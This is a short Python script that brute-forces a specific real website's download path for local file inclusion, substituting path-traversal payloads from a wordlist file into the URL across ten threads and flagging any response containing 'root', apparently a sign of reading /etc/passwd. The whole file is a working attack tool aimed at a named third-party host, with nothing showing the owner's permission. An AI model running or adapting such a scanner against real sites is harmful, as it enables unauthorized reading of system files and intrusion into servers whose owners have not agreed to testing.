#https://kpolyakov.spb.ru/download/
import requests
import threading


def proccess_list(url, payload_list):
    for payload in payload_list:
        url_with_payload = url.replace('[LFI]', payload)
        try:
            r = requests.get(url_with_payload)
        except Exception as e:
            print(f'Error: {payload}')
            print(e)
            continue
        if 'root' in r.text:
            print(f'Code: {r.status_code}; Len: {len(r.content)}; Found: {payload}')
            exit()
            break
        else:
            print(f'Code: {r.status_code}; Len: {len(r.content)}; Not found: {payload}')


# [LFI]
url = 'https://kpolyakov.spb.ru/download/[LFI]'
num_of_threads = 10
threads = []

with open('traversals-8-deep-exotic-encoding.txt', 'r') as f:    
    all_lines = f.readlines()
    batch_len = len(all_lines) // num_of_threads

    payload_list = []
    for i in range(num_of_threads):
        payload_list.append(all_lines[i*batch_len:(i+1)*batch_len])

    for i in range(num_of_threads):
        t = threading.Thread(target=proccess_list, args=(url, payload_list[i]))
        t.start()
        threads.append(t)


for t in threads:
    t.join()

print("Finished!")
